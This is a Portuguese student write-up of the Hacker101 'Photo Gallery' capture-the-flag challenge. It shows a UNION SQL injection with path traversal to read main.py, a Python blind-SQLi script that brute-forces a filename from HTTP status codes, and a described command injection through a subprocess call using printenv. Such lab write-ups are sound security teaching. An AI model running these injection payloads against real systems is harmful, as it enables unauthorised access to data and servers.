## INTRODUÇÃO
![](https://i.imgur.com/xIUqemp.png)

Carolina Camacho

RM98171

noirangel707@protonmail.com

## FLAG0

O desafio escolhido foi Photo Gallery.
![](https://i.imgur.com/enz0vU0.png)
A página inicial do desafio é uma página contendo três fotos, das quais uma não é visível.

Analisando o código fonte percebi algo peculiar:
![](https://i.imgur.com/QU8Sbzt.png)
As imagens estão passando por uma página chamada "fetch" que recebe um parâmetro "id" contendo o id da foto. Acessando essa página obtemos o arquivo da foto, porém em texto:
![](https://i.imgur.com/F2joeSt.png)
Esses tipos de consultas podem ser vulneráveis a Error Based SQLi, por tanto tentei algumas queries possíveis mas sem sucesso em nenhuma, sempre acabava com a mensagem de "Internal Error":
![](https://i.imgur.com/lxQkBKG.png)
Após algumas horas quebrando a cabeça, decidi acessar a dica:
![](https://i.imgur.com/EhObF5f.png)
O que não foi extremamente útil, porque já estava trabalhando com a suposição de um SQLi, mas sem sucesso. Após mais algumas horas, decidi procurar um writeup porque não fazia mais ideia do que tentar:
![](https://i.imgur.com/mHeb4Hi.png)
Aparentemente em uma versão mais antiga do desafio, a dica era mais útil, reafirmando o SQLi mas dando uma dica essencial: a aplicação está utilizando **flask**, que é uma biblioteca **python**. Com essa informação, algumas novas ideias apareceram. Se essa aplicação foi implementada em Python, é possível que através de SQLi + Path Traversal eu possa acessar o código Python da página.
![](https://i.imgur.com/JjYyyxU.png)
Utilizando a seguinte query: `?id=99 UNION SELECT '/../../main.py'` é possível acessar, de fato, o código python. É necessário que o id selecionado **não exista**. O comando "UNION" irá unir o resultado das duas queries, a original e a nossa query injetada, que por sua vez irá acessar o arquivo "main.py", que está dois diretórios acima do diretório de trabalho da aplicação.

Após formatar o código python, eu adquiri a flag:
![](https://i.imgur.com/9w4r5QW.png)

## FLAG1

Essa flag exigiu bastante esforço. Utilizando a dica do writeup que estava lendo, já que essa dica é mais detalhada, podemos começar a raciocinar:
![](https://i.imgur.com/RtZdUZG.png)
Claramente a flag está relacionada com a foto de id 3, que nunca é exibida.

Quando fazemos uma query por qualquer ID que não seja o 3, se ele não existir, será retornado uma página 404 normal. O problema sempre está no id 3, que retorna um código 500 - Internal Server Error. Isso significa que existe algo com o arquivo de id 3 que quebra a query SQL. Analisando o código da main.py obtido anteriormente, o único campo possível que poderia quebrar a query SQL é o campo "filename".

Sabendo que qualquer query inexistente retorna 404 e a query que contém o filename do id 3 retorna 500, podemos construir um código que irá utilizar esses status codes para montar o nome do arquivo que está quebrado.

```python
import requests

def check(str):
    resp = requests.get(f"https://1a2dcd11786d02757af0605099400221.ctf.hacker101.com/fetch?id=-1 UNION SELECT filename FROM photos WHERE filename LIKE '{str}%' AND id=3")
    print(resp.status_code)
    if resp.status_code == 500:
        return True
    else:
        return False

CHARSET = list(''.join(map(str, range(10))) + 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')
payload = ''

while True:
    for c in CHARSET:
        print(f"Trying: {c} for {payload}")
        test = payload + c
        if check(str(test)):
            payload += c
            print(payload)
            break

```

O código em questão irá utilizar do comando "LIKE" na nova query SQL. Esse, por sua vez, irá encontrar um arquivo que contenha algo "como" a string inserida. Além disso, forçamos que o ID seja 3. Após isso, iremos iterar sobre uma lista de caracteres (charset) que irá incrementar o nome do arquivo com uma letra a cada request feita com a resposta sendo um 500 - Internal Server Error. Eventualmente teremos o nome completo do arquivo.
![](https://i.imgur.com/qNbssOW.png)
Adicionando as tags de FLAG da Hacker101 e inputando a flag, conquistamos mais uma, concluindo o desafio da flag1.

## FLAG2
![](https://i.imgur.com/YWECWkl.png)
A segunda flag irá trabalhar com outra query SQL. No código, existe uma linha que utiliza uma chamada para subprocess, que é suspeita porque permite a execução de comandos de sistema. Pela forma como está escrita, é possível que possamos fechar as aspas e adicionar um payload na query.

Vamos atualizar o nome do arquivo id3. Com o payload correto, é possível, por conta da linha que utiliza a subprocess, injetar a flag no código fonte da página principal.
![](https://i.imgur.com/I3ox177.png)
Utilizando esse payload, definimos que o arquivo de id 3 terá seu nome alterado para o output do comando "printenv". O que fará com que a flag seja injetada no código fonte da página:
![](https://i.imgur.com/6AkMcVi.png)

Encerrando, assim, o CTF.
